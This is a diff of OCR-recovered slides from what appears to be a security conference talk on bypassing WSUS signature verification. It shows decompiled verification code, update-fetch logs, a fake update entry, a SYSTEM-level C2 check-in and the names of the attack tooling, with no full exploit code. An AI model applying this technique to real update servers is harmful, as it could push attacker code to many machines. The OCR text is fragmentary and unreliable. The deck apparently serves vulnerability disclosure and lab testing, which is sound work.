 File Edit View Debug Window Help @ © i CG ~|| 9
-Fs REESE SOR a
 4 4$ ContentSyncAgent @02000005
 > Mi Base Type and Interfaces
 Derived Types
@@ -1394,12 +1290,10 @@ EventReportingContentFile(string, string, string, Updateldentity[], WsusEven
 EventReportingContentFile(string, string, string, Updateldentity[], WsusEven
 EventReportingContentSyncAgent(short, string) : void @0600002D
 ExecuteSPGetExportUpdateData(int) : ExportUpdateData @06000022
-steed lara He : FileNeededByContentAgent @(
 ecutesPoetvextC ontentSyncWorkitemOnStartup(byte[]) : FileNeededByC
 ExecuteSPNotifyContentSyncNotificationEventWorking() : void @06000021
 GetUNCFilePath(string) : string @06000013
 GetUpdatesForFile(Guid) : UpdatelnformationForFile @06000023
-lobErrorflBitcloh RitclobError ctring): void M@NSNNNN17
 61
 ```
 
@@ -1407,11 +1301,10 @@ lobErrorflBitcloh RitclobError ctring): void M@NSNNNN17
 
 62
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-piseichat
-USA 2026
 private VerifyResult VerifyFile(string fileLocalPath, string additionalHash)
 {
 if (fileLocalPath == null)
@@ -1424,10 +1317,6 @@ if (verifyResult == VerifyResult.Valid)
 {
 bool flag = true;
 if (fileLocalPath. ToLower(CultureInfo. InvariantCulture).Endswith
-".txt",| StringComparison.OrdinalIgnore | fileLocalPath. ToLower
-ultureInfo. InvariantCulture).Endswith(".esd"
-StringComparison.OrdinalIgnoreCase))
-t
 flag = false;
 t
 if (flag)
@@ -1447,7 +1336,8 @@ Bypassing Signature V erification Bypassing Signature V erification
 
 63
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Bypassing Signature Verification
@@ -1464,7 +1354,6 @@ Bypassing Signature Verification
 [10.2.10.3] "GET /Ghost.txt HTTP/1.1" 206 -
 [10.2.10.3] "GET /Ghost.txt HTTP/1.1" 206 -
 [10.2.10.3] "GET /Ghost.txt HTTP/1.1" 206 -
-USA 2026
 ```
 
 ## Slide 64
@@ -1473,7 +1362,8 @@ Bypassing Signature V erification Bypassing Signature V erification
 
 64
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Bypassing Signature Verification
@@ -1497,8 +1387,6 @@ Updates superseding this update: None
 Updates superseded by this update: None
 Languages supported: All
 Update ID: 0a93df0b-afd2-449e-8a52-0115a0de686d
-piseichat
-USA 2026
 ```
 
 ## Slide 65
@@ -1507,7 +1395,8 @@ Bypassing Signature V erification Bypassing Signature V erification
 
 65
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 83/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Bypassing Signature Verification
@@ -1519,8 +1408,6 @@ EventId=366, Type=Information, Category=Synchronization jMessage=Content file do
 Digest:
 Source File: /Ghost.txt
 Destination File: C:\\WSUS\WsusContent\95\4861DE7211476BAC49F126F6946AF29880CFD995. txt
-piseichat
-USA 2026
 65
 ```
 
@@ -1530,16 +1417,14 @@ Bypassing Signature V erification Bypassing Signature V erification
 
 66
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Bypassing Signature Verification
 Bypassing Signature Verification
 Windows Update
-= Updates available
-/
 K_/ Last checked: Today, 4:38 PM
-USA 2026
 66
 ```
 
@@ -1549,14 +1434,14 @@ Bypassing Signature V erification Bypassing Signature V erification
 
 67
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Bypassing Signature Verification
 Bypassing Signature Verification
 ll] HOST | USER ll DOMAIN | PID | LAST CHECKIN
 WORKSTATION2 SYSTEM LUDUS 10088 15 seconds
-USA 2026
 ll DESCRIPTION
 Whooooohoooo0000! ! !
 67
@@ -1574,14 +1459,14 @@ Whooooohoooo0000! ! !
 
 68
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 85/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Exploitation Difficulty
 ¢ WSUS Administrator
 ¢ WSUS File System Access
 ¢ Digitally Signature
-USA 2026
 @
 McDelivery |
 | Uber
@@ -1593,12 +1478,11 @@ McDelivery |
 
 69
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 72/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-BB Windows PowerShell X BB Windows PowerShell BS | ies Ba?
 root@Ludus3: /mnt/remote-share/WSUSpicious# |
-USA 2026
 Activate Windo
 “Ludus3" 20:28 30-Dec-2
 69
@@ -1610,12 +1494,11 @@ Activate Windo
 
 70
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 96/100 on the text kept, 96/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 W SUS Client Setting Options
-piseichat
-USA 2026
 Setting
 Defer Windows Updates
 Do not display ‘Install Updates and Shut Down’ option in Sh...
@@ -1692,11 +1575,10 @@ No
 
 71
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-piseichat
-USA 2026
 ® Configure Automatic Updates
 FE} Configure Automatic Updates Previous Setting Next Setting
 ONot Configured Comment:
@@ -1709,7 +1591,6 @@ Configure automatic updating
 uto download and notify for install Automatic maintenance can be further configured by using
 Group Policy settings here: Computer Configuration-
 ‘or download and notify for install 5 :
-> Administrative Templates indows Components-
 uto download and notify for install
 | 4- Auto download and schedule the install |_| > Maintenance Scheduler
 3 - Allow Tocal admin to choose setting — .
@@ -1755,24 +1636,16 @@ On the W SUS Database server:
 
 73
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Goodies
 Ludus WSUS Range
-piseichat
-USA 2026
-github.com/bagelByt3s/ludus
-(1 README
 WSUS Collection for Ansible and Ludus
 This collection includes Ansible roles to install WSUS. For a good example of the collection’s usage, see the wWSUS-
 Range.yml .
 Roles included in this collection:
-© bagelByt3s.ludus_wsus.ludus_wsus_client_initiate
-bagelByt3s.ludus_wsus.ludus_wsus_configure_client_gpo
-bagelByt3s.ludus_wsus.ludus_wsus_force_group_policy_update
-bagelByt3s.ludus_wsus.1ludus_wsus_install_wsus_server
-bagelByt3s.ludus_wsus.1ludus_wsus_wsus_sql
 Associated Blogpost: TBD
 Installation in Ludus
 Install via Ansible Gala»
@@ -1786,36 +1659,18 @@ ludus ansible collection add bagelbyt3s.1udus_wsus
 
 74
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 65/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Goodies
-NotW SUS picious.py
-@ NotWSUSpicious +
 BP main ~ P 1Branch © 0 Tags
 @ bagelByt3s Fixed <
-custom-mssqlclient
-() BitsWebServer.py
-1 NotWsUSpicious.py
-() README.md
 1 README
 NotWSUSpicious
-J, WIM
-JI\ -IdSTd
-JH, 117
-IAS ALVIN
-std IS
 /\__//
-/\/ 1
-piseichat
-USA 2026
-m-mssqlclient
 Fixed ascii ar
 Updated for
-ee ee
-VV I/II _N ITT
-PID IIIS TID TIS
-/_I\__/_/\. /\. /
 Add file ~
 1 minute ago
 © Watch
@@ -1825,17 +1680,14 @@ yesterday
 yesterday
 1 minute
 6 minut
-o
 ago
 ago
-0)
-~  & Fork o WW Star 0
+~ & Fork o WW Star 0
 About 8
 Python helper to generate SQL
 commands to create a custom update in
 the Windows Service Update Service
 (WSUS) database.
-© Readme
 > 0 watching
 Packages
 No packages published
@@ -1886,11 +1738,10 @@ Publis first package
 
 Thank you
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 84/100 on the text kept, 65/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-~ ne SPECTERUPS
-USA 2026
 Thank You
 X @ bagelByt3s
 in Beyviel David a
